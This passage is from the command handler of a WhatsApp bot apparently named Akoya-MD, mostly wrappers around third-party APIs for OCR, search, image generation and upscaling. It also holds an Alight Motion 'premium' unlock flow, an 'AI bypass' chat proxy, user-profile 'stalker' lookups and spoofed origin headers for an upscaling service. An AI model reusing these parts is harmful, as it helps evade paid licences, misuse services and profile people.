            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
              return xreply("❌ invalid email format.\n\n" + example("user@gmail.com"));
            }
            await xreply("🔐 *AM PREMIUM V2*\n\n" + "📨 Step 1: sending the verification link...\n" + "⏳ please wait...");
            const sendRes = await axios.get("https://v2.api-varhad.my.id/tools/amprem/verif/email", {
              params: {
                email: email
              },
              headers: {
                "Accept": "application/json"
              },
              timeout: 60000
            });
            const sendData = sendRes.data;
            console.log("AMPREM V2 SEND:", JSON.stringify(sendData, null, 2));
            if (!sendData?.status || !sendData?.result?.success) {
              return xreply("❌ failed to send the verification link.\n" + `message: ${sendData?.result?.message || "Unknown error"}`);
            }
            await xreply("✅ link sent to your email.\n\n" + "⚠️ *Step next:*\n" + "1. Open the target email (inbox/spam)\n" + "2. click the verification link from Alight Motion\n" + "3. Copy URL in address bar after redirect\n" + "4. Run command:\n" + example(`${prefix}amverif2 ${email}|COPIED_LINK`));
          } catch (err) {
            console.error("AMPREM V2 ERROR:", err?.response?.data || err);
            const errorData = err?.response?.data;
            return xreply("❌ an error occurred.\n\n" + (errorData ? JSON.stringify(errorData, null, 2) : err.message));
          }
        }
        break;

      /// ───────────── [ 𝖨𝗆𝖺𝗀𝖾 & 𝖮𝖢𝖱 𝖳𝗈𝗈𝗅𝗌 ] ──────────── ///
      case "ocr":
        {
          const fs = require("fs");
          const {
            ImageUploadService
          } = require("node-upload-images");
          let media;
          try {
            const qmsg = m.quoted ? m.quoted : m;
            const mime = qmsg?.mime || "";
            if (!/image\/(jpe?g|png|webp)/i.test(mime)) {
              return xreply(example("by replying to a photo"));
            }
            await xreply("⏳ reading text from the photo...");
            media = await client.downloadAndSaveMediaMessage(qmsg);
            if (!media || !fs.existsSync(media)) {
              return xreply("❌ failed to fetch the photo.");
            }
            const service = new ImageUploadService("pixhost.to");
            const upload = await service.uploadFromBinary(fs.readFileSync(media), "Akoya-md.png");
            const imageUrl = upload?.directLink?.toString();
            if (!imageUrl) {
              return xreply("❌ failed to get the Pixhost URL.");
            }
            console.log("OCR PIXHOST URL:", imageUrl);
            const apiUrl = "https://api.nexray.eu.cc/tools/ocr?url=" + encodeURIComponent(imageUrl);
            const response = await axios.get(apiUrl, {
              timeout: 120000
            });
            const data = response.data;
            console.log("OCR RESPONSE:", JSON.stringify(data, null, 2));
            if (!data?.status || !data?.result) {
              return xreply("❌ the OCR API returned no result.");
            }
            const result = data.result;
            const hasilText = result.text?.trim();
            if (!hasilText) {
              return xreply("❌ no text could be detected in the photo.");
            }
            await xreply(`🔎 *OCR IMAGE*\n` + `━━━━━━━━━━━━━━━━━━\n\n` + `${hasilText}\n\n` + `━━━━━━━━━━━━━━━━━━\n` + `📷 *Source:* Pixhost\n`);
          } catch (err) {
            console.error("OCR ERROR:", err?.response?.data || err);
            return xreply("❌ OCR processing failed.\n\n" + "Kemungkinan cause:\n" + "• Pixhost upload failed\n" + "• the photo could not be read\n" + "• API OCR having problems\n" + "• Request timeout");
          } finally {
            try {
              if (media && fs.existsSync(media)) {
                fs.unlinkSync(media);
              }
            } catch (e) {
              console.error("failed to delete the temporary file:", e);
            }
          }
        }
        break;

      /// ───────────── [ 𝖶𝖾𝖻𝗌𝗂𝗍𝖾 𝖳𝗈𝗈𝗅𝗌 ] ──────────── ///
      case "webtozip":
        {
          try {
            const url = text?.trim();
            if (!url) {
              return xreply(example("https://www.rafaofficial.my.id/index.html"));
            }
            if (!/^https?:\/\//i.test(url)) {
              return xreply("❌ invalid URL.\nuse a URL starting with http:// or https://");
            }
            await xreply("⏳ converting the website to ZIP...");
            const apiUrl = "https://api.nexray.eu.cc/tools/webtozip?url=" + encodeURIComponent(url);
            const response = await axios.get(apiUrl, {
              timeout: 180000
            });
            const data = response.data;
            console.log("WEBTOZIP RESPONSE:", JSON.stringify(data, null, 2));
            if (!data?.status || !data?.result) {
              return xreply("❌ failed to create ZIP from the website.");
            }
            const result = data.result;
            if (result.error?.code !== "-" || !result.downloadUrl) {
              return xreply("❌ the website could not be processed.\n" + `Error: ${result.error?.text || "unknown"}`);
            }
            const teks = `✅ *website successfully zipped*
` + `━━━━━━━━━━━━━━━━━━\n` + `🌐 URL: ${result.url || url}\n` + `📁 File copied: *${result.copiedFilesAmount ?? 0}*\n` + `📦 Download ZIP:\n${result.downloadUrl}\n` + `━━━━━━━━━━━━━━━━━━\n` + `🤖 Source: Akoya-MD`;
            await xreply(teks);
          } catch (err) {
            console.error("WEBTOZIP ERROR:", err?.response?.data || err);
            return xreply("❌ failed converting the website to ZIP.\n" + "the site may be unreachable, or the API timed out.");
          }
        }
        break;

      /// ───────────── [ 𝖠𝖨 𝖢𝗁𝖺𝗍 ] ──────────── ///
      case "bypass":
        {
          try {
            const query = text?.trim();
            if (!query) {
              return xreply(example("hallo"));
            }
            await xreply("🤖 processing...");
            const apiUrl = "https://api.nexray.eu.cc/ai/bypass?text=" + encodeURIComponent(query);
            const response = await axios.get(apiUrl, {
              timeout: 120000
            });
            const data = response.data;
            console.log("BYPASS RESPONSE:", JSON.stringify(data, null, 2));
            if (!data?.status || !data?.result) {
              return xreply("❌ AI Bypass gave no answer.");
            }
            await xreply("🤖 *AI BYPASS*\n\n" + data.result);
          } catch (err) {
            console.error("BYPASS ERROR:", err?.response?.data || err);
            return xreply("❌ failed to contact AI Bypass.\n" + "try again in a moment.");
          }
        }
        break;
      case "claude":
        {
          try {
            const query = text?.trim();
            if (!query) {
              return xreply(example("hello how are you"));
            }
            await xreply("🤖 Claude thinking...");
            const apiUrl = "https://api.nexray.eu.cc/ai/claude?text=" + encodeURIComponent(query);
            const response = await axios.get(apiUrl, {
              timeout: 120000
            });
            const data = response.data;
            console.log("CLAUDE RESPONSE:", JSON.stringify(data, null, 2));
            if (!data?.status || !data?.result) {
              return xreply("❌ Claude gave no answer.");
            }
            await xreply("🤖 *CLAUDE AI*\n\n" + data.result);
          } catch (err) {
            console.error("CLAUDE ERROR:", err?.response?.data || err);
            return xreply("❌ failed to contact Claude AI.\n" + "try again in a moment.");
          }
        }
        break;
      case "gptai":
        {
          try {
            const query = text?.trim();
            if (!query) {
              return xreply(example("who is Thomas Alva Edison?"));
            }
            await xreply("🤖 thinking...");
            const apiUrl = "https://api.azbry.com/api/ai/gpt4o?q=" + encodeURIComponent(query);
            const response = await axios.get(apiUrl, {
              timeout: 120000
            });
            const data = response.data;
            if (!data?.status || !data?.result?.answer) {
              console.log("GPT4O RESPONSE:", data);
              return xreply("❌ GPT-4o gave no answer.");
            }
            const answer = data.result.answer;
            await xreply("🤖 *GPT-4o*\n\n" + answer);
          } catch (err) {
            console.error("GPT4O ERROR:", err?.response?.data || err);
            return xreply("❌ failed to contact GPT-4o.\n" + "try again in a moment.");
          }
        }
        break;

      /// ───────────── [ 𝖲𝗍𝖺𝗅𝗄𝖾𝗋 ] ──────────── ///
      case "ff":
        {
          try {
            const uid = text?.trim();
            if (!uid) {
              return xreply(example("123456789"));
            }
            if (!/^\d+$/.test(uid)) {
              return xreply("❌ the Free Fire UID may only contain digits.");
            }
            await xreply("🔎 fetching the account data Free Fire...");
            const apiUrl = "https://api.nexray.eu.cc/stalker/freefire?uid=" + encodeURIComponent(uid);
            const response = await axios.get(apiUrl, {
              timeout: 60000
            });
            const data = response.data;
            console.log("FREEFIRE RESPONSE:", JSON.stringify(data, null, 2));
            if (!data?.status || !data?.result) {
              return xreply("❌ Free Fire account data not found.");
            }
            const ff = data.result;
            let teks = `🎮 *FREE FIRE STALKER*\n` + `━━━━━━━━━━━━━━━━━━\n` + `🆔 UID: *${ff.uid || uid}*\n` + `👤 Name: *${ff.name || "-"}*\n` + `⭐ Level: *${ff.level ?? "-"}*\n` + `✨ EXP: *${ff.exp ?? "-"}*\n` + `🌍 Region: *${ff.region || "-"}*\n` + `❤️ Likes: *${ff.likes || "0"}*\n` + `🏆 Prime Level: *${ff.prime_level ?? "-"}*\n` + `👑 Honor Score: *${ff.honor_score ?? "-"}*\n` + `🎖️ Title: *${ff.title ?? "-"}*\n` + `✍️ Signature: *${ff.signature ?? "-"}*\n` + `🔥 Fire Pass: *${ff.fire_pass ?? "-"}*\n` + `🎯 BP Badges: *${ff.bp_badges ?? "-"}*\n` + `🏅 BR Rank: *${ff.br_rank ?? "-"}*\n` + `🎮 CS Points: *${ff.cs_points ?? "-"}*\n` + `━━━━━━━━━━━━━━━━━━\n` + `👤 Author: ${global.botname}`;
            await xreply(teks);
          } catch (err) {
            console.error("FREEFIRE ERROR:", err?.response?.data || err);
            return xreply("❌ failed to fetch Free Fire data.\n" + "make sure the UID is correct or or the API is not having issues.");
          }
        }
        break;
      case "steam":
      case "steamstalk":
        {
          try {
            if (!text) {
              return xreply(`usage example:

.steam bola`);
            }
            const axios = require('axios');
            let {
              data
            } = await axios.get(`https://api.synoxcloud.xyz/stalker/steam?username=${encodeURIComponent(text)}`);
            if (!data.status) {
              return xreply("Steam username not found");
            }
            let res = data.result;
            let caption = `🎮 *S T E A M - S T A L K E R*

👤 Username : ${res.username || '-'}
🏷️ Display Name : ${res.display_name || '-'}
📛 Real Name : ${res.real_name || '-'}
📡 Status : ${res.status || '-'}
📍 Location : ${res.location || '-'}
⭐ Level : ${res.level || 0}
🏅 Badges : ${res.badges || 0}
🎲 Games Owned : ${res.games_owned || 0}
📅 Member Since : ${res.member_since || '-'}
👤 Profile : ${res.profile_url || '-'}`;
            if (res.recent_games && res.recent_games.length) {
              caption += `\n\n🕹️ Recent Games:\n`;
              for (let game of res.recent_games.slice(0, 10)) {
                caption += `• ${game.name || game}\n`;
              }
            }
            if (res.avatar) {
              await client.sendMessage(m.chat, {
                image: {
                  url: res.avatar
                },
                caption
              }, {
                quoted: m
              });
            } else {
              await xreply(caption);
            }
          } catch (e) {
            console.error(e);
            xreply(`an error occurred:
${e.message}`);
          }
        }
        break;
      case 'stalktele':
      case 'stalktelegram':
        {
          try {
            if (!text) {
              return xreply(`usage example:

.stalktele Akoya-MD`);
            }
            const axios = require('axios');
            let {
              data
            } = await axios.get(`https://api.synoxcloud.xyz/stalker/telegram?username=${encodeURIComponent(text.replace('@', ''))}`);
            if (!data.status) {
              return xreply("Telegram username not found");
            }
            let res = data.result;
            let caption = `🔍 *TELEGRAM STALKER*\n\n`;
            caption += `👤 *Name* : ${res.name || '-'}\n`;
            caption += `📛 *Username* : ${res.username || '-'}\n`;
            caption += `📝 *Bio* : ${res.bio || '-'}\n`;
            caption += `🏷️ *Tipe* : ${res.type || '-'}\n`;
            caption += `👥 *Subscribers* : ${res.subscribers || '0'}\n`;
            caption += `🔗 *Profile* : ${res.profile_url || '-'}\n`;
            caption += `📌 *Extra* : ${res.extra || '-'}\n`;
            await client.sendMessage(m.chat, {
              image: {
                url: res.photo
              },
              caption
            }, {
              quoted: m
            });
          } catch (e) {
            console.error(e);
            xreply("failed to fetch Telegram data");
          }
        }
        break;

      /// ───────────── [ 𝖲𝖾𝖺𝗋𝖼𝗁 ] ──────────── ///
      case "wikipedia":
        {
          try {
            const query = text?.trim();
            if (!query) {
              return xreply(example("javascript"));
            }
            await xreply("🔎 searching Wikipedia...");
            const apiUrl = "https://api.nexray.eu.cc/search/wikipedia?q=" + encodeURIComponent(query);
            const response = await axios.get(apiUrl, {
              timeout: 60000
            });
            const data = response.data;
            console.log("WIKIPEDIA RESPONSE:", JSON.stringify(data, null, 2));
            if (!data?.status || !Array.isArray(data?.result)) {
              return xreply("❌ the Wikipedia API returned no valid results.");
            }
            const results = data.result;
            if (results.length === 0) {
              return xreply(`❌ no Wikipedia results found for: *${query}*`);
            }
            let teks = `🔎 *WIKIPEDIA SEARCH*\n` + `━━━━━━━━━━━━━━━━━━\n` + `🔍 Query: *${query}*\n` + `📊 Found: *${results.length}*\n\n`;
            results.slice(0, 10).forEach((item, index) => {
              const snippet = String(item.snippet || "no ringkasan").replace(/<[^>]*>/g, "").replace(/&quot;/g, '"').replace(/&#39;/g, "'").replace(/&amp;/g, "&").replace(/&lt;/g, "<").replace(/&gt;/g, ">");
              teks += `*${index + 1}. ${item.title || "Untitled"}*\n` + `🆔 Page ID: ${item.pageid ?? "-"}\n` + `📦 Size: ${item.size ?? "-"}\n` + `📝 Words: ${item.wordcount ?? "-"}\n` + `📖 ${snippet}\n` + `🕒 ${item.timestamp || "-"}\n\n`;
            });
            teks += `━━━━━━━━━━━━━━━━━━\n` + `👤 Author: ${global.botname}`;
            await xreply(teks);
          } catch (err) {
            console.error("WIKIPEDIA ERROR:", err?.response?.data || err);
            return xreply("❌ failed to search Wikipedia.\n" + "the API may be erroring or timed out.");
          }
        }
        break;
      case "groupsor":
        {
          try {
            const query = text?.trim();
            if (!query) {
              return xreply(example("study group"));
            }
            await xreply("🔎 searching for the group...");
            const apiUrl = "https://api.nexray.eu.cc/search/groupsor?q=" + encodeURIComponent(query);
            const response = await axios.get(apiUrl, {
              timeout: 60000
            });
            const data = response.data;
            console.log("GROUPSOR RESPONSE:", JSON.stringify(data, null, 2));
            if (!data?.status || !Array.isArray(data?.result)) {
              return xreply("❌ the API returned no valid results.");
            }
            const results = data.result;
            if (results.length === 0) {
              return xreply(`❌ no group found for: *${query}*`);
            }
            let teks = `🔎 *SEARCH GROUP*\n` + `━━━━━━━━━━━━━━━━━━\n` + `🔍 Query: *${query}*\n` + `📊 Found: *${results.length}*\n\n`;
            results.slice(0, 10).forEach((group, index) => {
              teks += `*${index + 1}. ${group.name || "No name"}*\n` + `📝 ${group.description || "no description"}\n` + `📂 Kategori: ${group.category || "-"}\n` + `🌍 Negara: ${group.country || "-"}\n` + `🔗 ${group.url || "-"}\n\n`;
            });
            teks += `━━━━━━━━━━━━━━━━━━\n` + `Akoya-MD`;
            await xreply(teks);
          } catch (err) {
            console.error("GROUPSOR ERROR:", err?.response?.data || err);
            return xreply("❌ failed to search for the group.\n" + "the API may be erroring or timed out.");
          }
        }
        break;
      case "happymood":
        {
          try {
            const query = text?.trim();
            if (!query) {
              return xreply(example("dana"));
            }
            await xreply("🔎 searching for the app...");
            const apiUrl = "https://api.nexray.eu.cc/search/happymood?q=" + encodeURIComponent(query);
            const response = await axios.get(apiUrl, {
              timeout: 60000
            });
            const data = response.data;
            console.log("HAPPYMOOD RESPONSE:", JSON.stringify(data, null, 2));
            if (!data?.status || !Array.isArray(data?.result)) {
              return xreply("❌ the API returned no valid results.");
            }
            const results = data.result;
            if (results.length === 0) {
              return xreply(`❌ no app found for: *${query}*`);
            }
            let teks = `🔎 *HAPPYMOOD SEARCH*\n` + `━━━━━━━━━━━━━━━━━━\n` + `🔍 Query: *${query}*\n` + `📊 Found: *${results.length}*\n\n`;
            results.slice(0, 10).forEach((app, index) => {
              teks += `*${index + 1}. ${app.title || "Unknown"}*\n` + `📱 Version: ${app.version || "-"}\n` + `📦 Ukuran: ${app.size || "-"}\n` + `🛠️ Mod: ${app.mod_status || "no"}\n` + `🔗 URL: ${app.url || "-"}\n\n`;
            });
            teks += `━━━━━━━━━━━━━━━━━━\n` + `Akoya-MD`;
            await xreply(teks);
          } catch (err) {
            console.error("HAPPYMOOD ERROR:", err?.response?.data || err);
            return xreply("❌ failed to search for the app.\n" + "the API may be erroring or timed out.");
          }
        }
        break;
      case "github":
        {
          try {
            const query = text?.trim();
            if (!query) {
              return xreply(example("Akoya-MD"));
            }
            await xreply("🔎 searching GitHub...");
            const apiUrl = "https://api.nexray.eu.cc/search/github?q=" + encodeURIComponent(query);
            const response = await axios.get(apiUrl, {
              timeout: 60000
            });
            const data = response.data;
            console.log("GITHUB RESPONSE:", JSON.stringify(data, null, 2));
            if (!data?.status || !Array.isArray(data?.result)) {
              return xreply("❌ the GitHub API returned no valid results.");
            }
            const results = data.result;
            if (results.length === 0) {
              return xreply(`❌ no results found for *${query}*.`);
            }
            let teks = `🔎 *GITHUB SEARCH*\n` + `━━━━━━━━━━━━━━━━━━\n` + `🔍 Query: *${query}*\n` + `📊 Result: *${results.length}*\n\n`;
            results.slice(0, 10).forEach((item, index) => {
              const file = item.file || {};
              const repo = item.repository || {};
              teks += `*${index + 1}. ${repo.full_name || repo.name || "Unknown Repository"}*\n` + `📄 File: ${file.name || "Unknown"}\n` + `📁 Path: ${file.path || "-"}\n` + `📝 ${repo.description || "no description"}\n` + `⭐ Stars: ${repo.stars ?? 0}\n` + `🍴 Forks: ${repo.forks ?? 0}\n` + `⚠️ Issues: ${repo.issues ?? 0}\n` + `💻 Language: ${repo.language || "unknown"}\n` + `🔗 ${repo.url || file.url || "-"}\n` + `📦 Raw: ${file.raw_url || "-"}\n\n`;
            });
            teks += `━━━━━━━━━━━━━━━━━━\n` + `👤 Author: ${global.botname}`;
            await xreply(teks);
          } catch (err) {
            console.error("GITHUB ERROR:", err?.response?.data || err);
            return xreply("❌ failed to search GitHub.\n" + "try again in a moment.");
          }
        }
        break;
      case 'playstore2':
        {
          try {
            if (!text) {
              return xreply(`usage example:

.playstore mobile legend`);
            }
            const axios = require('axios');
            let {
              data
            } = await axios.get(`https://api.synoxcloud.xyz/search/playstore?q=${encodeURIComponent(text)}`);
            if (!data.status || !data.data?.length) {
              return xreply("app not found");
            }
            let result = data.data.slice(0, 10);
            let caption = `📱 *PLAYSTORE SEARCH*

🔎 Keyword : ${text}
📦 Total : ${data.total}

`;
            result.forEach((app, i) => {
              caption += `${i + 1}. *${app.name}*
👤 Developer : ${app.developer}
⭐ Rating : ${app.rating_text}
🔗 Link : ${app.url}

`;
            });
            await client.sendMessage(m.chat, {
              image: {
                url: result[0].image
              },
              caption
            }, {
              quoted: m
            });
          } catch (e) {
            console.error(e);
            xreply("failed to search the Play Store");
          }
        }
        break;
      case 'playstore':
        {
          if (!text) return xreply(`${prefix + command} WhatsApp`);
          xreply('Processing...');
          await fetch(`https://api.diioffc.web.id/api/search/playstore?query=${text}`).then(async res => {
            let response = await res.json();
            let teks = '*🔎 Search results PLAY STORE*\n\n';
            for (let i of response.result) {
              teks += `*◦ Title :* ${i.nama}\n`;
              teks += `*◦ Developer :* ${i.developer}\n`;
              teks += `*◦ Rating :* ${i.rate}\n`;
              teks += `*◦ Link Developer Url :* ${i.link_dev}\n`;
              teks += `*◦ Link Apps Url :* ${i.link}\n\n`;
            }
            xreply(teks);
          }).catch(err => xreply('Error 🗿'));
        }
        break;

      /// ───────────── [ 𝖱𝖺𝗇𝖽𝗈𝗆 𝖨𝗆𝖺𝗀𝖾 ] ──────────── ///
      case "pap":
        {
          try {
            await xreply("⏳ fetching a random photo...");
            const response = await axios.get("https://api.nexadev.my.id/api/random/pap", {
              responseType: "arraybuffer",
              timeout: 60000
            });
            const contentType = response.headers["content-type"] || "";
            if (!contentType.includes("image")) {
              return xreply("❌ the API did not return an image.");
            }
            await client.sendMessage(m.chat, {
              image: Buffer.from(response.data),
              caption: "📸 Random PAP"
            }, {
              quoted: m
            });
          } catch (err) {
            console.error("PAP ERROR:", err);
            xreply("❌ failed to fetch random PAP.");
          }
        }
        break;
      case "anime":
        {
          try {
            await xreply("⏳ fetching a random anime image...");
            const response = await axios.get("https://api.nexadev.my.id/api/random/anime", {
              responseType: "arraybuffer",
              timeout: 60000
            });
            const contentType = response.headers["content-type"] || "";
            if (!contentType.includes("image")) {
              return xreply("❌ the API did not return an image.");
            }
            await client.sendMessage(m.chat, {
              image: Buffer.from(response.data),
              caption: "🌸 Random Anime"
            }, {
              quoted: m
            });
          } catch (err) {
            console.error("ANIME ERROR:", err);
            xreply("❌ failed to fetch a random anime image.");
          }
        }
        break;

      /// ───────────── [ 𝖨𝗆𝖺𝗀𝖾 𝖠𝖨 ] ──────────── ///
      case "imageai":
      case "aiimg":
        {
          try {
            if (!text) {
              return xreply(`example:
${prefix}zimage cool anime in a night city`);
            }
            const axios = require("axios");
            await xreply(`
⏳ generating the image...`);
            const response = await axios.get("https://bintangapi.my.id/api/aiimg/zimage", {
              params: {
                prompt: text
              },
              responseType: "arraybuffer",
              timeout: 180000,
              transformResponse: [data => data],
              validateStatus: () => true
            });
            console.log("ZIMAGE STATUS:", response.status);
            console.log("ZIMAGE TYPE:", response.headers["content-type"]);
            console.log("ZIMAGE LENGTH:", response.data?.length);
            if (response.status < 200 || response.status >= 300) {
              let errText;
              try {
                errText = Buffer.from(response.data).toString("utf8");
              } catch {
                errText = `HTTP ${response.status}`;
              }
              return xreply(`❌ *ZIMAGE API ERROR*

HTTP:
${response.status}

${errText.substring(0, 1000)}`);
            }
            const imageBuffer = Buffer.from(response.data);
            if (!imageBuffer.length) {
              return xreply("❌ Image response is empty.");
            }
            const contentType = response.headers["content-type"] || "";
            console.log("ZIMAGE BUFFER:", imageBuffer.length);
            if (!contentType.includes("image")) {
              const result = imageBuffer.toString("utf8");
              console.log("ZIMAGE NON-IMAGE RESPONSE:", result);
              return xreply(`❌ *the API did not return an image*

Content-Type:
${contentType}

Response:
${result.substring(0, 1000)}`);
            }
            await client.sendMessage(m.chat, {
              image: imageBuffer,
              caption: `✨ *IMAGE AI success*

📝 Prompt:
${text}

📦 Size:
${(imageBuffer.length / 1024).toFixed(2)} KB

Akoya-MD`
            }, {
              quoted: m
            });
          } catch (e) {
            console.log("ZIMAGE ERROR:", e);
            return xreply(`❌ *ZIMAGE ERROR*

${e.message || e}`);
          }
        }
        break;

      /// ───────────── [ 𝖴𝗉𝗌𝖼𝖺𝗅𝖾 𝖨𝗆𝖺𝗀𝖾 ] ──────────── ///
      case "upscale2":
        {
          try {
            if (!/image/.test(mime)) {
              return xreply(`❌ *reply to a photo first*

example:
reply to a photo then type:
${prefix}upscale2`);
            }
            await xreply("⏳ Uploading photo to Pixhost...");
            let media = await client.downloadAndSaveMediaMessage(qmsg);
            if (!media || !fs.existsSync(media)) {
              return xreply("❌ failed to fetch the photo.");
            }
            const {
              ImageUploadService
            } = require("node-upload-images");
            const service = new ImageUploadService("pixhost.to");
            let {
              directLink
            } = await service.uploadFromBinary(fs.readFileSync(media), "upscale2.png");
            fs.unlinkSync(media);
            if (!directLink) {
              return xreply("❌ failed to get the Pixhost URL.");
            }
            const imageUrl = directLink.toString();
            await xreply("⏳ processing the upscale 2X...");
            const apiUrl = `https://api.nexray.eu.cc/tools/v4/upscale?url=${encodeURIComponent(imageUrl)}&resolusi=2`;
            const response = await axios.get(apiUrl, {
              responseType: "arraybuffer",
              timeout: 180000,
              headers: {
                "User-Agent": "Mozilla/5.0",
                "Accept": "image/*"
              },
              maxContentLength: 50 * 1024 * 1024,
              maxBodyLength: 50 * 1024 * 1024
            });
            if (!response.data || !response.data.length) {
              return xreply("❌ the API did not return an image.");
            }
            const contentType = response.headers["content-type"] || "";
            if (!contentType.includes("image")) {
              let errorText = "";
              try {
                errorText = Buffer.from(response.data).toString("utf8");
              } catch {
                errorText = "the API response is not an image.";
              }
              return xreply(`❌ *UPSCALE 2X failed*

${errorText.substring(0, 1000)}`);
            }
            await client.sendMessage(m.chat, {
              image: Buffer.from(response.data),
              caption: `✨ *IMAGE UPSCALE 2X*

✅ successfully enhanced the photo quality.
`
            }, {
              quoted: m
            });
          } catch (e) {
            console.log("UPSCALE2 ERROR:", e);
            return xreply(`❌ *UPSCALE 2X ERROR*

${e.response?.data?.message || e.response?.data?.msg || e.message || "an unknown error occurred."}`);
          }
        }
        break;
      case "upscale3":
        {
          try {
            if (!/image/.test(mime)) {
              return xreply(`❌ *reply to a photo first*

example:
reply to a photo then type:
${prefix}upscale4`);
            }
            await xreply("⏳ Uploading photo to Pixhost...");
            let media = await client.downloadAndSaveMediaMessage(qmsg);
            if (!media || !fs.existsSync(media)) {
              return xreply("❌ failed to fetch the photo.");
            }
            const {
              ImageUploadService
            } = require("node-upload-images");
            const service = new ImageUploadService("pixhost.to");
            let {
              directLink
            } = await service.uploadFromBinary(fs.readFileSync(media), "upscale4.png");
            fs.unlinkSync(media);
            if (!directLink) {
              return xreply("❌ failed to get the Pixhost URL.");
            }
            const imageUrl = directLink.toString();
            await xreply("⏳ processing the upscale 4X...");
            const apiUrl = `https://api.nexray.eu.cc/tools/v4/upscale?url=${encodeURIComponent(imageUrl)}&resolusi=4`;
            const response = await axios.get(apiUrl, {
              responseType: "arraybuffer",
              timeout: 240000,
              headers: {
                "User-Agent": "Mozilla/5.0",
                "Accept": "image/*"
              },
              maxContentLength: 80 * 1024 * 1024,
              maxBodyLength: 80 * 1024 * 1024
            });
            if (!response.data || !response.data.length) {
              return xreply("❌ the API did not return an image.");
            }
            const contentType = response.headers["content-type"] || "";
            if (!contentType.includes("image")) {
              let errorText = "";
              try {
                errorText = Buffer.from(response.data).toString("utf8");
              } catch {
                errorText = "the API response is not an image.";
              }
              return xreply(`❌ *UPSCALE 4X failed*

${errorText.substring(0, 1000)}`);
            }
            await client.sendMessage(m.chat, {
              image: Buffer.from(response.data),
              caption: `🔥 *IMAGE UPSCALE 4X*

✅ successfully enhanced the photo quality.
`
            }, {
              quoted: m
            });
          } catch (e) {
            console.log("UPSCALE4 ERROR:", e);
            return xreply(`❌ *UPSCALE 4X ERROR*

${e.response?.data?.message || e.response?.data?.msg || e.message || "an unknown error occurred."}`);
          }
        }
        break;
      case "upscale":
        {
          try {
            if (!/image/.test(mime)) {
              return xreply(`❌ reply/send a photo first

example:
${prefix}upscale`);
            }
            await xreply('⏳ Uploading photo...');
            let media = await client.downloadAndSaveMediaMessage(qmsg);
            if (!media || !fs.existsSync(media)) {
              return xreply("❌ failed to fetch the photo");
            }
            const {
              ImageUploadService
            } = require('node-upload-images');
            const service = new ImageUploadService('pixhost.to');
            let {
              directLink
            } = await service.uploadFromBinary(fs.readFileSync(media), 'upscale.png');
            fs.unlinkSync(media);
            if (!directLink) {
              return xreply("❌ failed to get the Pixhost URL");
            }
            const imageUrl = directLink.toString();
            await xreply("⏳ enhancing the photo...");
            const apiUrl = `https://api.nexray.eu.cc/tools/v1/upscale?url=${encodeURIComponent(imageUrl)}`;
            const response = await axios.get(apiUrl, {
              responseType: 'arraybuffer',
              timeout: 120000,
              headers: {
                'User-Agent': 'Mozilla/5.0',
                'Accept': 'image/*'
              },
              maxContentLength: 30 * 1024 * 1024,
              maxBodyLength: 30 * 1024 * 1024
            });
            if (!response.data || !response.data.length) {
              return xreply("❌ the upscale API did not return an image.");
            }
            const contentType = response.headers['content-type'] || '';
            if (!contentType.includes('image')) {
              let errorText = '';
              try {
                errorText = Buffer.from(response.data).toString('utf8');
              } catch {
                errorText = "the API response is not an image.";
              }
              return xreply(`❌ *UPSCALE failed*

${errorText.substring(0, 1000)}`);
            }
            await client.sendMessage(m.chat, {
              image: Buffer.from(response.data),
              caption: `✨ *IMAGE UPSCALE*

✅ the photo quality was successfully enhanced.`
            }, {
              quoted: m
            });
          } catch (e) {
            console.log('UPSCALE ERROR:', e);
            let errorMessage = e.response?.data?.message || e.response?.data?.msg || e.message || "an unknown error occurred.";
            if (e.code === 'ECONNABORTED' || e.code === 'ETIMEDOUT') {
              errorMessage = "API request timed out. Please try again.";
            }
            if (e.response?.status === 404) {
              errorMessage = "upscale endpoint not found.";
            }
            if (e.response?.status === 429) {
              errorMessage = "too many requests. Please wait a moment.";
            }
            return xreply(`❌ *UPSCALE ERROR*

${errorMessage}`);
          }
        }
        break;
      case 'remini':
      case 'hd2':
        {
          const availableScaleRatio = [2, 4];
          const imgupscale = {
            req: async (imagePath, scaleRatio) => {
              const FormData = require('form-data');
              const fs = require('fs');
              const axios = require('axios');
              const form = new FormData();
              form.append('myfile', fs.createReadStream(imagePath));
              form.append('scaleRadio', scaleRatio.toString());
              const response = await axios.request({
                method: 'POST',
                url: 'https://get1.imglarger.com/api/UpscalerNew/UploadNew',
                headers: {
                  'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/5.37.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/5.37.36',
                  'Accept': 'application/json, text/plain, */*',
                  'origin': 'https://imgupscaler.com',
                  'referer': 'https://imgupscaler.com/',
                  ...form.getHeaders()
                },
                data: form
              });
              return response.data;
            },
            cek: async (code, scaleRatio) => {
              const axios = require('axios');
              const response = await axios.request({
                method: 'POST',
                url: 'https://get1.imglarger.com/api/UpscalerNew/CheckStatusNew',
                headers: {
                  'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/5.37.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/5.37.36',
                  'Accept': 'application/json, text/plain, */*',
                  'Content-Type': 'application/json',
                  'origin': 'https://imgupscaler.com',
                  'referer': 'https://imgupscaler.com/'
                },
                data: JSON.stringify({
                  code,
                  scaleRadio: scaleRatio
                })
              });
              return response.data;
            },
            upscale: async (imagePath, scaleRatio, maxRetries = 30, retryDelay = 2000) => {
              const uploadResult = await imgupscale.req(imagePath, scaleRatio);
              if (uploadResult.code !== 200) {
                throw new Error(`Upload failed: ${uploadResult.msg}`);
              }
              const {
                code
              } = uploadResult.data;
              for (let i = 0; i < maxRetries; i++) {
                const statusResult = await imgupscale.cek(code, scaleRatio);
                if (statusResult.code === 200 && statusResult.data.status === 'success') {
                  return {
                    success: true,
                    downloadUrls: statusResult.data.downloadUrls
                  };
                }
                if (statusResult.data.status === 'error') {
                  throw new Error('Processing failed on server');
                }
                await new Promise(resolve => setTimeout(resolve, retryDelay));
              }
              throw new Error('Processing timeout - maximum retries exceeded');
            }
          };
          if (!m.quoted || !/image/.test(m.quoted.mimetype || '')) {
            return xreply("reply to an image with the command.hd 2x or.hd 4x");
          }
          const scale = args[0]?.replace(/x/i, '') || '2';
          if (!availableScaleRatio.includes(Number(scale))) {
            return xreply("choose a resolution: 2x or 4x");
          }
          let tmpPath;
          try {
            await xreply("⏳ processing the image, please wait...");
            const buffer = await client.downloadMediaMessage(m.quoted);
            const tmpDir = './tmp';
            const fs = require('fs');
            if (!fs.existsSync(tmpDir)) {
